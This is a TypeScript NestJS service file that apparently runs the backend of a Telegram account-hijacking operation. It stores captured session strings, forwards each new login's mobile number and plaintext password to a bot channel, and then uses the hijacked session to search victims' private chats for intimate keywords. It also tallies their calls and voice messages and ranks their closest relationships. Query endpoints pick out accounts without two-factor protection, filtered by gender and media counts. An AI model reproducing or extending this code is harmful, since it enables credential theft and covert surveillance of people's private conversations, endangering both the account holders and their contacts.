import { TelegramService } from './../Telegram/Telegram.service';
import {
  BadRequestException,
  Inject,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
  forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, QueryFilter } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';
import { sleep } from 'telegram/Helpers';
import { Logger } from '../../utils';
import { INTIMATE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
import { Api } from 'telegram/tl';
import bigInt from 'big-integer';
import { parseError } from '../../utils/parseError';

@Injectable()
export class UsersService {
  private readonly logger = new Logger(UsersService.name);

  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService
  ) { }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
    this.logger.log(`New User received - ${user?.mobile}`);
    this.logger.debug('ActiveClientSetup:', activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
      await this.clientsService.updateClientSession(user.session, user.mobile);
    } else {
      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
      const newUser = new this.userModel(user);
      const saved = await newUser.save();
      setTimeout(() => {
        this.computeRelationshipScore(user.mobile).catch(err => {
          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
        });
      }, 5000);
      return saved;
    }
  }

  async top(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      gender,
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.score': { $gte: minScore },
    };

    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;
    if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
    if (minPhotos > 0) query['stats.photoCount'] = { $gte: minPhotos };
    if (minVideos > 0) query['stats.videoCount'] = { $gte: minVideos };

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session')
      .sort({ 'relationships.score': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {
    return this.userModel.find().limit(limit).skip(skip).exec();
  }

  async findOne(tgId: string): Promise<User> {
    const doc = await this.userModel.findOne({ tgId }).exec();
    if (!doc) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return doc.toJSON();
  }

  async update(tgId: string, updateDto: UpdateUserDto): Promise<number> {
    const result = await this.userModel
      .updateMany({ tgId }, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${tgId} not found`);
    }
    return result.modifiedCount;
  }

  async updateByFilter(
    filter: QueryFilter<UserDocument>,
    updateDto: UpdateUserDto,
  ): Promise<number> {
    const result = await this.userModel
      .updateMany(filter, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users matching filter not found`);
    }
    return result.modifiedCount;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ tgId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }

  async deleteById(userId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ _id: userId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with id ${userId} not found`);
    }
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    const query: QueryFilter<UserDocument> = { ...filter };

    if (query.firstName) {
      query.firstName = { $regex: new RegExp(query.firstName as string, 'i') };
    }

    return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
  }

  async computeRelationshipScore(mobile: string): Promise<void> {
    const wasConnected = connectionManager.hasClient(mobile);
    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;

    try {
      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });

      const topChats = await telegramClient.getTopPrivateChats(30, false);
      if (!topChats?.items?.length) {
        this.logger.log(`[${mobile}] No private chats found for scoring`);
        return;
      }

      const contactsResult = await telegramClient.getContacts();
      const mutualChatIds = new Set<string>();
      if (contactsResult && 'users' in contactsResult) {
        for (const user of (contactsResult as any).users || []) {
          if (user.mutualContact) {
            mutualChatIds.add(user.id?.toString());
          }
        }
      }

      const candidateChats = topChats.items.slice(0, 10);
      const candidates: RelationshipCandidate[] = [];

      for (const chat of candidateChats) {
        try {
          const chatPeer = await telegramClient.getchatId(chat.chatId === 'me' ? 'me' : chat.chatId);

          let voiceCount = 0;
          try {
            const counters = await telegramClient.client.invoke(
              new Api.messages.GetSearchCounters({
                peer: chatPeer,
                filters: [new Api.InputMessagesFilterVoice()],
              }),
            );
            voiceCount = (counters as any)?.[0]?.count ?? 0;
          } catch { }

          let commonChats = 0;
          if (chat.chatId !== 'me') {
            try {
              const common = await telegramClient.client.invoke(
                new Api.messages.GetCommonChats({
                  userId: chat.chatId,
                  maxId: bigInt(0),
                  limit: 100,
                }),
              );
              commonChats = (common as any)?.chats?.length ?? 0;
            } catch { }
          }

          let intimateMessageCount = 0;
          for (const keyword of INTIMATE_KEYWORDS) {
            try {
              const result = await telegramClient.client.invoke(
                new Api.messages.Search({
                  peer: chatPeer,
                  q: keyword,
                  filter: new Api.InputMessagesFilterEmpty(),
                  minDate: 0,
                  maxDate: 0,
                  offsetId: 0,
                  addOffset: 0,
                  limit: 1,
                  maxId: 0,
                  minId: 0,
                  hash: bigInt(0),
                }),
              );
              intimateMessageCount += (result as any)?.count ?? 0;
              await sleep(200);
            } catch { }
          }

          const callStats = chat.calls || { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0 };

          candidates.push({
            chatId: chat.chatId,
            name: chat.name,
            username: chat.username,
            phone: chat.phone,
            messages: chat.totalMessages,
            mediaCount: chat.mediaCount,
            voiceCount,
            intimateMessageCount,
            calls: {
              total: callStats.totalCalls,
              incoming: callStats.incoming,
              videoCalls: callStats.videoCalls,
              avgDuration: callStats.averageDuration,
              totalDuration: callStats.totalDuration,
            },
            commonChats,
            isMutualContact: mutualChatIds.has(chat.chatId),
            lastMessageDate: chat.lastMessageDate,
          });

          await sleep(300);
        } catch (chatError) {
          this.logger.warn(`[${mobile}] Failed to score chat ${chat.chatId}: ${(chatError as Error).message}`);
        }
      }

      const top = rankRelationships(candidates, 5);
      const accountScore = computeAccountScore(top);
      const bestScore = top.length > 0 ? top[0].score : 0;

      const callAgg = topChats.items.reduce(
        (acc, item) => {
          const c = item.calls || { totalCalls: 0, incoming: 0, outgoing: 0, videoCalls: 0, audioCalls: 0 };
          acc.totalCalls += c.totalCalls;
          acc.incoming += c.incoming;
          acc.outgoing += c.outgoing;
          acc.video += c.videoCalls;
          acc.audio += c.audioCalls;
          return acc;
        },
        { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 },
      );

      await this.userModel.updateOne(
        { mobile },
        {
          $set: {
            'relationships.score': accountScore,
            'relationships.bestScore': bestScore,
            'relationships.computedAt': new Date(),
            'relationships.top': top,
            calls: callAgg,
          },
        },
      ).exec();

      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}`);
    } catch (error) {
      parseError(error, `[${mobile}] computeRelationshipScore failed`);
    } finally {
      if (!wasConnected && telegramClient) {
        await connectionManager.unregisterClient(mobile).catch(() => undefined);
      }
    }
  }

  async topRelationships(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    gender?: string;
    excludeTwoFA?: boolean;
  }) {
    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.bestScore': { $gt: minScore },
    };
    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;

    const total = await this.userModel.countDocuments(query).exec();
    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort({ 'relationships.bestScore': -1 })
      .skip(skip)
      .limit(limitNum)
      .lean()
      .exec();

    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
  }

  async getUserRelationships(mobile: string) {
    const user = await this.userModel
      .findOne({ mobile })
      .select('mobile firstName lastName tgId relationships')
      .lean()
      .exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    return user;
  }

  async executeQuery(
    query: QueryFilter<UserDocument>,
    sort?: Record<string, 1 | -1>,
    limit?: number,
    skip?: number,
  ): Promise<User[]> {
    if (!query) {
      throw new BadRequestException('Query is invalid.');
    }

    try {
      const queryExec = this.userModel.find(query).lean();

      if (sort) queryExec.sort(sort);
      if (limit) queryExec.limit(limit);
      if (skip) queryExec.skip(skip);

      return await queryExec.exec();
    } catch (error) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
